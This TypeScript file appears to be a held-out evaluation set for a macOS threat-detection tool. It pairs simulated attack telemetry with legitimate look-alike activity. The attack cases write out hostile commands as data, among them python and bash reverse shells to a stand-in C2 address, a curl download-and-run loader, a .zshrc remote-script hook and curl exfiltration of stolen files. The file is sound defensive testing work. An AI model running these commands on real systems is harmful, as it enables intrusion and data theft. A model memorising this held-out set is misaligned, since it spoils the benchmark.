import type { ProcessRef, SensorEvent } from '@vigil/core';
import { HOME, type AttackScenario } from './attacks.js';

/**
 * The held-out set: attacks and look-alikes that no rule and no prompt was
 * tuned on. The score that counts comes from here; `ATTACKS` is the train set.
 *
 * - Written by hand from public reports on macOS threats (2023-2026), before
 *   reading the rule pack, and never picked because the rules miss them.
 * - Held-out attacks have no `expect`: any rule that raises an alert catches them.
 * - Look-alikes are legitimate activity that resembles an attack. Any alert
 *   on one is a false alert.
 *
 * Rules: don't read this file while writing or tuning rules or AI prompts,
 * and never paste its cases into a prompt. Tuning loops (the AI rule review,
 * the labeller hillclimb) see only train results; they read held-out scores
 * only to decide whether a change is kept. When a held-out case turns into a
 * rule's target, move it to `ATTACKS` and write a fresh one here.
 */

const TERMINAL = '/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal';
const CHROME = `${HOME}/Library/Application Support/Google/Chrome/Default`;
const C2 = '203.0.113.141'; // not on any feed

let seq = 0;
const id = () => `ho-${++seq}`;

function proc(path: string, over: Partial<ProcessRef> = {}): ProcessRef {
  const name = path.split('/').pop() ?? path;
  return { pid: 60_000 + (seq % 5_000), ppid: 900, path, args: [name], uid: 501, ...over };
}
const apple = (path: string, args: string[], parentPath: string, over: Partial<ProcessRef> = {}) =>
  proc(path, { args, signing: 'apple', parentPath, ...over });
const payload = (path: string, over: Partial<ProcessRef> = {}) =>
  proc(path, { signing: 'adhoc', sha256: 'c3'.repeat(32), parentPath: '/bin/zsh', ...over });
const signed = (path: string, teamId: string, over: Partial<ProcessRef> = {}) =>
  proc(path, { signing: 'developer_id', teamId, parentPath: '/sbin/launchd', ppid: 1, ...over });

const exec = (ts: number, process: ProcessRef): SensorEvent => ({
  id: id(),
  ts,
  source: 'santa',
  kind: 'process.exec',
  process,
});
const open = (ts: number, path: string, process: ProcessRef): SensorEvent => ({
  id: id(),
  ts,
  source: 'santa',
  kind: 'file',
  op: 'open',
  path,
  process,
});
const connect = (ts: number, remoteAddress: string, remotePort: number, process: ProcessRef) =>
  ({
    id: id(),
    ts,
    source: 'osquery',
    kind: 'network.connection',
    direction: 'outbound',
    protocol: 'tcp',
    remoteAddress,
    remotePort,
    process,
  }) satisfies SensorEvent;
const persist = (
  ts: number,
  mechanism: 'launch_agent' | 'launch_daemon' | 'login_item' | 'cron' | 'shell_profile',
  path: string,
  program?: string,
  programArgs?: string[],
): SensorEvent => ({
  id: id(),
  ts,
  source: 'osquery',
  kind: 'persistence',
  change: mechanism === 'shell_profile' ? 'modified' : 'added',
  mechanism,
  path,
  label: path
    .split('/')
    .pop()
    ?.replace(/\.plist$/, ''),
  ...(program ? { program } : {}),
  ...(programArgs ? { programArgs } : {}),
});
const shell = (cmd: string, parentPath = TERMINAL, sh = 'zsh') =>
  apple(`/bin/${sh}`, [sh, '-c', cmd], parentPath);

const STAGE = '/private/tmp/.9f2c';
const DROPPER = `${STAGE}/Installer`;

export const HELDOUT_ATTACKS: AttackScenario[] = [
  // ------------------------------------------------------------ credential access
  {
    id: 'ho-dscl-password-check',
    name: 'Stealer checks the typed password with dscl',
    mimics: 'AMOS, Cthulhu, Banshee (validate the password before using it)',
    tactic: 'credential-access',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      exec(
        at,
        apple('/usr/bin/dscl', ['dscl', '/Local/Default', '-authonly', 'sam', 'hunter2'], DROPPER),
      ),
    ],
  },
  {
    id: 'ho-notes-db',
    name: 'Unsigned program copies the Notes database',
    mimics: 'AMOS and Poseidon (Apple Notes theft)',
    tactic: 'collection',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      open(
        at,
        `${HOME}/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`,
        payload(DROPPER),
      ),
    ],
  },
  {
    id: 'ho-telegram-session',
    name: 'Unsigned program reads the Telegram session folder',
    mimics: 'Cuckoo, Poseidon (session hijack)',
    tactic: 'credential-access',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      open(
        at,
        `${HOME}/Library/Application Support/Telegram Desktop/tdata/key_datas`,
        payload(DROPPER),
      ),
    ],
  },
  {
    id: 'ho-safari-cookies',
    name: 'Unsigned program reads Safari cookies',
    mimics: 'AMOS, MetaStealer',
    tactic: 'credential-access',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      open(
        at,
        `${HOME}/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies`,
        payload(DROPPER),
      ),
    ],
  },
  {
    id: 'ho-metamask-vault',
    name: 'python3 reads the MetaMask extension vault',
    mimics: 'Python wallet stealers (browser-extension wallets)',
    tactic: 'credential-access',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      open(
        at,
        `${CHROME}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/000003.log`,
        apple('/usr/bin/python3', ['python3', `${STAGE}/w.py`], '/bin/zsh'),
      ),
    ],
  },
  {
    id: 'ho-admin-prompt',
    name: 'Installer asks for admin rights through do shell script',
    mimics: 'Adware and stealer installers (with administrator privileges)',
    tactic: 'execution',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      exec(
        at,
        apple(
          '/usr/bin/osascript',
          [
            'osascript',
            '-e',
            `do shell script "cp ${STAGE}/helper /Library/PrivilegedHelperTools/com.helper.agent" with administrator privileges`,
          ],
          DROPPER,
        ),
      ),
    ],
  },

  // ------------------------------------------------------------------ execution
  {
    id: 'ho-dmg-app-launch',
    name: 'Ad hoc signed app runs straight from a downloaded disk image',
    mimics: 'Poseidon and AMOS via fake Arc / ChatGPT ads',
    tactic: 'execution',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      exec(
        at,
        proc('/Volumes/Arc Setup/Arc.app/Contents/MacOS/Arc', {
          signing: 'adhoc',
          sha256: 'd4'.repeat(32),
          parentPath: '/sbin/launchd',
          ppid: 1,
          quarantine: { originUrl: 'https://arc-browser.example/download', agent: 'Google Chrome' },
        }),
      ),
    ],
  },
  {
    id: 'ho-python-reverse-shell',
    name: 'python3 one-liner reverse shell',
    mimics: 'Post-exploitation on developer Macs',
    tactic: 'execution',
    variant: 'heldout',
    expect: [],
    events: (at) => {
      const py = apple(
        '/usr/bin/python3',
        [
          'python3',
          '-c',
          `import socket,subprocess,os;s=socket.socket();s.connect(("${C2}",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])`,
        ],
        '/bin/zsh',
      );
      return [exec(at, py), connect(at + 50, C2, 4444, py)];
    },
  },
  {
    id: 'ho-bash-dev-tcp',
    name: 'bash reverse shell over /dev/tcp',
    mimics: 'Post-exploitation, malicious npm postinstall',
    tactic: 'execution',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      exec(at, shell(`bash -i >& /dev/tcp/${C2}/443 0>&1`, '/usr/local/bin/node', 'bash')),
    ],
  },
  {
    id: 'ho-chmod-run-shared',
    name: 'Download to /Users/Shared, chmod +x, run',
    mimics: 'KandyKorn / RustBucket loaders',
    tactic: 'execution',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      exec(
        at,
        shell(
          'curl -sk https://cloud-sync.example/p -o /Users/Shared/.pld && chmod +x /Users/Shared/.pld && /Users/Shared/.pld &',
          '/usr/bin/python3',
        ),
      ),
      exec(at + 2_000, proc('/Users/Shared/.pld', { signing: 'unsigned', parentPath: '/bin/zsh' })),
    ],
  },

  // ------------------------------------------------------------- defense evasion
  {
    id: 'ho-root-cert',
    name: 'Installer trusts its own root certificate',
    mimics: 'Adware proxies intercepting HTTPS (e.g. Pirrit, Bundlore)',
    tactic: 'defense-evasion',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      exec(
        at,
        apple(
          '/usr/bin/security',
          [
            'security',
            'add-trusted-cert',
            '-d',
            '-r',
            'trustRoot',
            '-k',
            '/Library/Keychains/System.keychain',
            `${STAGE}/ca.crt`,
          ],
          '/usr/bin/sudo',
        ),
      ),
    ],
  },
  {
    id: 'ho-web-proxy',
    name: 'Installer points the web proxy at itself',
    mimics: 'Adware traffic hijack',
    tactic: 'defense-evasion',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      exec(
        at,
        apple(
          '/usr/sbin/networksetup',
          ['networksetup', '-setsecurewebproxy', 'Wi-Fi', '127.0.0.1', '8899'],
          DROPPER,
        ),
      ),
    ],
  },
  {
    id: 'ho-firewall-off',
    name: 'Application firewall turned off',
    mimics: 'Backdoor installers',
    tactic: 'defense-evasion',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      exec(
        at,
        apple(
          '/usr/libexec/ApplicationFirewall/socketfilterfw',
          ['socketfilterfw', '--setglobalstate', 'off'],
          '/usr/bin/sudo',
        ),
      ),
    ],
  },
  {
    id: 'ho-gatekeeper-override',
    name: 'User overrides Gatekeeper for an unsigned download',
    mimics: 'Social engineering around Sequoia\'s "Open Anyway"',
    tactic: 'defense-evasion',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      {
        id: id(),
        ts: at,
        source: 'santa',
        kind: 'system.alert',
        subtype: 'gatekeeper_override',
        path: `${HOME}/Downloads/CleanMyMac Pro.app`,
        details: {},
      },
    ],
  },
  {
    id: 'ho-xprotect-other',
    name: 'XProtect flags a stealer family',
    mimics: 'XProtect signature for Banshee',
    tactic: 'defense-evasion',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      {
        id: id(),
        ts: at,
        source: 'santa',
        kind: 'system.alert',
        subtype: 'xprotect_detected',
        path: `${HOME}/Downloads/Figma Setup.app`,
        details: { malware: 'MACOS.BANSHEE.B' },
      },
    ],
  },

  // ----------------------------------------------------------------- persistence
  {
    id: 'ho-launch-daemon',
    name: 'Launch daemon for a hidden root helper',
    mimics: 'Adload / Pirrit root persistence',
    tactic: 'persistence',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      persist(
        at,
        'launch_daemon',
        '/Library/LaunchDaemons/com.search.helperd.plist',
        '/Library/Application Support/.searchd/helperd',
      ),
    ],
  },
  {
    id: 'ho-zshrc-hook',
    name: 'Line added to ~/.zshrc that fetches a script',
    mimics: 'Shell-profile persistence (ZuRu, supply-chain payloads)',
    tactic: 'persistence',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      persist(at, 'shell_profile', `${HOME}/.zshrc`, '/bin/zsh', [
        'zsh',
        '-c',
        'curl -s https://cloud-sync.example/r | zsh >/dev/null 2>&1 &',
      ]),
    ],
  },
  {
    id: 'ho-cron-python',
    name: 'Cron job runs a hidden Python script every 10 minutes',
    mimics: 'Python backdoors (e.g. from pirated apps)',
    tactic: 'persistence',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      persist(at, 'cron', '/usr/lib/cron/tabs/sam', '/usr/bin/python3', [
        'python3',
        `${HOME}/.local/.cache/.sync.py`,
      ]),
    ],
  },
  {
    id: 'ho-login-item',
    name: 'Login item for an app hidden in ~/Library',
    mimics: 'Stealer backdoors kept alive at login',
    tactic: 'persistence',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      persist(
        at,
        'login_item',
        `${HOME}/Library/.Updater.app`,
        `${HOME}/Library/.Updater.app/Contents/MacOS/Updater`,
      ),
    ],
  },

  // --------------------------------------------------------- command and control
  {
    id: 'ho-beacon-app-support',
    name: 'Unsigned program in Application Support beacons to a new server',
    mimics: 'RustBucket, KandyKorn C2 (address on no feed)',
    tactic: 'command-and-control',
    variant: 'heldout',
    expect: [],
    events: (at) => {
      const p = payload(`${HOME}/Library/Application Support/.CloudKit/cloudd`, {
        signing: 'unsigned',
        parentPath: '/sbin/launchd',
        ppid: 1,
      });
      return [0, 60_000, 120_000, 180_000].map((d) => connect(at + d, C2, 8443, p));
    },
  },
  {
    id: 'ho-exfil-curl-post',
    name: 'curl posts a zip of stolen data',
    mimics: 'AMOS exfiltration (POST to /joinsystem)',
    tactic: 'command-and-control',
    variant: 'heldout',
    expect: [],
    events: (at) => {
      const c = apple(
        '/usr/bin/curl',
        [
          'curl',
          '-X',
          'POST',
          '-H',
          'user: 7Xq2',
          '--max-time',
          '300',
          '-F',
          `file=@${STAGE}/out.zip`,
          `http://${C2}/joinsystem`,
        ],
        DROPPER,
      );
      return [exec(at, c), connect(at + 100, C2, 80, c)];
    },
  },

  // ------------------------------------------------------------------ collection
  {
    id: 'ho-ditto-staging',
    name: 'ditto zips a staging folder',
    mimics: 'AMOS and Poseidon (stage, then archive)',
    tactic: 'collection',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      exec(
        at,
        apple(
          '/usr/bin/ditto',
          [
            'ditto',
            '-c',
            '-k',
            '--sequesterRsrc',
            '--keepParent',
            `${STAGE}/d`,
            `${STAGE}/out.zip`,
          ],
          DROPPER,
        ),
      ),
    ],
  },
  {
    id: 'ho-finder-filegrabber',
    name: 'AppleScript tells Finder to copy documents',
    mimics: 'AMOS / Banshee FileGrabber (Finder duplicate)',
    tactic: 'collection',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      exec(
        at,
        apple(
          '/usr/bin/osascript',
          [
            'osascript',
            '-e',
            `tell application "Finder" to duplicate (every file of folder "Documents" of home whose name extension is in {"pdf","docx","txt","wallet","key"}) to POSIX file "${STAGE}/d" with replacing`,
          ],
          DROPPER,
        ),
      ),
    ],
  },
  {
    id: 'ho-silent-screenshot',
    name: 'Silent screenshot from a background program',
    mimics: 'Spyware (screencapture -x)',
    tactic: 'collection',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      exec(
        at,
        apple(
          '/usr/sbin/screencapture',
          ['screencapture', '-x', '-t', 'jpg', `${STAGE}/s.jpg`],
          `${HOME}/Library/Application Support/.CloudKit/cloudd`,
        ),
      ),
    ],
  },
  {
    id: 'ho-system-recon',
    name: 'system_profiler hardware and display recon',
    mimics: 'AMOS and Cuckoo host profiling (sent with the loot)',
    tactic: 'collection',
    variant: 'heldout',
    expect: [],
    events: (at) => [
      exec(
        at,
        apple(
          '/usr/sbin/system_profiler',
          ['system_profiler', 'SPSoftwareDataType', 'SPHardwareDataType', 'SPDisplaysDataType'],
          DROPPER,
        ),
      ),
    ],
  },
];

/** Legitimate activity that looks like an attack. Any alert here is a false alert. */
export interface HeldoutLookalike {
  id: string;
  name: string;
  /** What real software does this. */
  who: string;
  events: (at: number) => SensorEvent[];
}

export const HELDOUT_LOOKALIKES: HeldoutLookalike[] = [
  {
    id: 'ho-ok-gh-keychain',
    name: 'GitHub CLI reads its token from the keychain',
    who: 'gh auth token, git-credential-osxkeychain',
    events: (at) => [
      exec(
        at,
        apple(
          '/usr/bin/security',
          ['security', 'find-generic-password', '-s', 'gh:github.com', '-w'],
          '/opt/homebrew/Cellar/gh/2.61.0/bin/gh',
        ),
      ),
    ],
  },
  {
    id: 'ho-ok-chrome-own-logins',
    name: 'Chrome opens its own saved passwords',
    who: 'Google Chrome',
    events: (at) => [
      open(
        at,
        `${CHROME}/Login Data`,
        signed('/Applications/Google Chrome.app/Contents/MacOS/Google Chrome', 'EQHXZ8M8AV'),
      ),
    ],
  },
  {
    id: 'ho-ok-1password-cli',
    name: '1Password CLI reads a secret for a deploy script',
    who: '1Password op',
    events: (at) => [
      exec(
        at,
        signed('/opt/homebrew/bin/op', '2BUA8C4S2C', {
          args: ['op', 'read', 'op://Private/aws/secret'],
          parentPath: '/bin/zsh',
          ppid: 900,
        }),
      ),
    ],
  },
  {
    id: 'ho-ok-dropbox-sync',
    name: 'Dropbox syncs 80 documents',
    who: 'Dropbox',
    events: (at) => {
      const d = signed('/Applications/Dropbox.app/Contents/MacOS/Dropbox', 'G7HH3F8CAK');
      return Array.from({ length: 80 }, (_, i) =>
        open(at + i * 200, `${HOME}/Documents/Taxes/2025/receipt-${i}.pdf`, d),
      );
    },
  },
  {
    id: 'ho-ok-docker-daemon',
    name: 'Docker Desktop installs its privileged helper',
    who: 'Docker Desktop',
    events: (at) => [
      persist(
        at,
        'launch_daemon',
        '/Library/LaunchDaemons/com.docker.vmnetd.plist',
        '/Library/PrivilegedHelperTools/com.docker.vmnetd',
      ),
    ],
  },
  {
    id: 'ho-ok-zoom-agent',
    name: 'Zoom adds its updater launch agent',
    who: 'Zoom',
    events: (at) => [
      persist(
        at,
        'launch_agent',
        `${HOME}/Library/LaunchAgents/us.zoom.updater.login.check.plist`,
        '/Library/Application Support/zoom.us/ZoomUpdater.app/Contents/MacOS/ZoomUpdater',
      ),
    ],
  },
  {
    id: 'ho-ok-notify-script',
    name: 'Build script shows a notification with osascript',
    who: 'Build scripts, Makefiles',
    events: (at) => [
      exec(
        at,
        apple(
          '/usr/bin/osascript',
          ['osascript', '-e', 'display notification "Build finished" with title "make"'],
          '/bin/zsh',
        ),
      ),
    ],
  },
  {
    id: 'ho-ok-xcode-archive',
    name: 'Xcode zips an archive with ditto',
    who: 'Xcode, notarytool workflows',
    events: (at) => [
      exec(
        at,
        apple(
          '/usr/bin/ditto',
          ['ditto', '-c', '-k', '--keepParent', `${HOME}/code/App/build/App.app`, 'App.zip'],
          '/bin/zsh',
        ),
      ),
    ],
  },
  {
    id: 'ho-ok-cargo-binary',
    name: 'Unsigned debug build runs and talks to localhost',
    who: 'cargo run, go run',
    events: (at) => {
      const b = proc(`${HOME}/code/api/target/debug/api`, {
        signing: 'adhoc',
        parentPath: `${HOME}/.cargo/bin/cargo`,
      });
      return [exec(at, b), connect(at + 300, '127.0.0.1', 5432, b)];
    },
  },
  {
    id: 'ho-ok-tailscale-proxy',
    name: 'VPN client reads the proxy settings',
    who: 'Tailscale, corporate VPNs',
    events: (at) => [
      exec(
        at,
        apple(
          '/usr/sbin/networksetup',
          ['networksetup', '-getsecurewebproxy', 'Wi-Fi'],
          '/Applications/Tailscale.app/Contents/MacOS/Tailscale',
        ),
      ),
    ],
  },
  {
    id: 'ho-ok-screenshot-shortcut',
    name: 'User takes a screenshot with the keyboard shortcut',
    who: 'macOS Screenshot',
    events: (at) => [
      exec(
        at,
        apple(
          '/usr/sbin/screencapture',
          ['screencapture', '-i', '-U', `${HOME}/Desktop/Screenshot.png`],
          '/System/Library/CoreServices/SystemUIServer.app/Contents/MacOS/SystemUIServer',
        ),
      ),
    ],
  },
  {
    id: 'ho-ok-nvm-profile',
    name: 'nvm adds its loader to ~/.zshrc',
    who: 'nvm, conda, pyenv installers',
    events: (at) => [
      persist(at, 'shell_profile', `${HOME}/.zshrc`, '/bin/zsh', [
        'zsh',
        '-c',
        '[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"',
      ]),
    ],
  },
  {
    id: 'ho-ok-signal-own-data',
    name: 'Signal Desktop opens its own database',
    who: 'Signal Desktop',
    events: (at) => [
      open(
        at,
        `${HOME}/Library/Application Support/Signal/sql/db.sqlite`,
        signed('/Applications/Signal.app/Contents/MacOS/Signal', 'U68MSDN6DR'),
      ),
    ],
  },
  {
    id: 'ho-ok-brew-services-cron',
    name: 'Backup tool schedules a nightly cron job',
    who: 'restic / borg setups',
    events: (at) => [
      persist(at, 'cron', '/usr/lib/cron/tabs/sam', '/opt/homebrew/bin/restic', [
        'restic',
        'backup',
        `${HOME}/Documents`,
      ]),
    ],
  },
];
